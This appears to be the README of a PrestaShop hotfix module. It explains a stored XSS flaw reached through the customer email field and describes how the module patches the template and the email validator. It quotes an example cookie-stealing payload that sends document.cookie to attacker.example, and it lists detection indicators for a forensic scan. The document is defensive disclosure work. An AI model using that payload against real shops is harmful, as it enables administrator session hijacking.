# tecno_xss_hotfix

Security hotfix module for PrestaShop — patches stored XSS vulnerability [GHSA-w9f3-qc75-qgx9](https://github.com/advisories/GHSA-w9f3-qc75-qgx9).

| | |
|---|---|
| **Severity** | Critical — CVSS 9.3 / 10 |
| **Type** | Stored XSS (CWE-79) |
| **Vector** | Customer email field → Back-Office Customer Threads view |
| **Affected** | PS 1.6.x, 1.7.x, PS 8.x < 8.2.6, PS 9.x < 9.1.1 |
| **Author** | [Tecnoacquisti.com](https://www.tecnoacquisti.com) |

---

## The vulnerability

An attacker registers an account (or submits a contact form) using a crafted email address containing HTML/JavaScript — for example:

```
"><script>fetch('https://attacker.example/c?'+document.cookie)</script>@x.com
```

When a Back-Office administrator opens the **Customer Threads** page, the email is rendered verbatim in the Smarty template without escaping, executing the script in the admin session. The attacker obtains the session cookie and gains full BO access.

**Root cause — two unpatched locations:**

1. `{admin}/themes/default/template/controllers/customer_threads/helpers/view/view.tpl`  
   `{$thread->email}` rendered without `|escape:'html':'UTF-8'`

2. `classes/Validate.php` — `isEmail()` accepts email addresses containing `<`, `>` and `"`:
   - PS ≥ 8.0.2: regex uses `'mode' => 'loose'` (allows quoted strings)
   - PS 1.7: `egulias/email-validator` with `RFCValidation` (RFC 5321 quoted local-parts)
   - Before PS 1.7.7.0-beta.1 `preg_match` with regex

---

## What the module does

### On install / Apply Patches

| Target | Action |
|--------|--------|
| `{admin}/themes/default/template/controllers/customer_threads/helpers/view/view.tpl` | Adds `\|escape:'html':'UTF-8'` to `{$thread->email}` |
| `classes/Validate.php` (PS ≥ 8.0.2, no override) | Changes `'mode' => 'loose'` → `'mode' => 'strict'` |
| `classes/Validate.php` (PS 1.7, no override) | Injects `preg_match('/[<>"]/', $email)` guard before the `EmailValidator` call |

Before any write a `.tecno-hotfix-backup` file is created next to the original.

> **The template patch is permanent.** Uninstalling the module does **not** revert it. This is intentional: the fix must survive module removal.

### When an `isEmail()` override is present

`override/classes/Validate.php` is never modified automatically. The module detects the override and shows the code snippet to apply manually.

### Forensic DB scan

The admin page includes a one-click database scan that searches `ps_customer`, `ps_customer_thread`, `ps_customer_message` and `ps_employee` for XSS indicators of compromise (IoC): email addresses or message bodies containing `<`, `>`, `"`, `script`, `javascript:`, event handler attributes, `document.cookie`, `eval(`, etc.

If hits are found, guided remediation steps are shown inline.

---

## Compatibility

| PrestaShop | PHP | Status |
|------------|-----|--------|
| 1.6.0.9+ | Supported |
| 1.7.x | 7.2 – 8.x | Supported |
| 8.0 – 8.2.5 | 8.1+ | Supported |
| 9.0 – 9.1.0 | 8.1+ | Supported |
| 8.2.6+ / 9.1.1+ | — | Patch applied by PS itself; module detects already-patched state |

---

## Installation

1. Upload the `tecno_xss_hotfix` directory to `{shop}/modules/`
2. Install from **Back-Office > Modules > Module Manager**
3. To prevent possible errors with non-compatible shop versions the patch/re-patch must be applied manually on first launch.
4. Verify the green status badges on the module configuration page

To re-apply (e.g. after a PS core update that overwrote `Validate.php`):  
open the module configuration page and click **Apply / Re-apply Patches**.

---

## Manual fix — isEmail() override

If `override/classes/Validate.php` contains `isEmail()`, add this guard at the top of the method body:

```php
public static function isEmail($email)
{
    // XSS guard — GHSA-w9f3-qc75-qgx9
    if (!empty($email) && preg_match('/[<>"]/', $email)) {
        return false;
    }
    return parent::isEmail($email);
}
```

---

## If the vulnerability was exploited — immediate actions

1. **Reset all admin passwords** — Back-Office > Team > Employees
2. **Rotate cookie keys** — `_COOKIE_KEY_` and `_COOKIE_IV_` in `app/config/parameters.php` (PS 8/9) or `config/settings.inc.php` (PS 1.7)
3. **Invalidate active sessions** — run on your database:
   ```sql
   UPDATE ps_employee SET cookie_token = '';
   ```
4. **Audit admin accounts** — delete any employee you do not recognise
5. **Search access logs** for requests to the Customer Threads admin page around the time of the suspicious record
6. **Check for modified files**:
   ```bash
   find /var/www/html -name "*.php" -newer /var/www/html/index.php \
     -not -path "*/cache/*" -not -path "*/var/*"
   ```
7. **Review `ps_configuration`** for unexpected changes to shop URL, email settings, or payment parameters

---

## File structure

```
tecno_xss_hotfix/
├── tecno_xss_hotfix.php          Main module class — patching logic + forensic scan
└── views/templates/admin/
    ├── status.tpl                Patch status & apply page
    └── forensic.tpl              DB IoC scan page
```

---

## License

MIT License — © 2009-2026 Arte e Informatica / Tecnoacquisti.com  
See [LICENSE](LICENSE) for the full text.
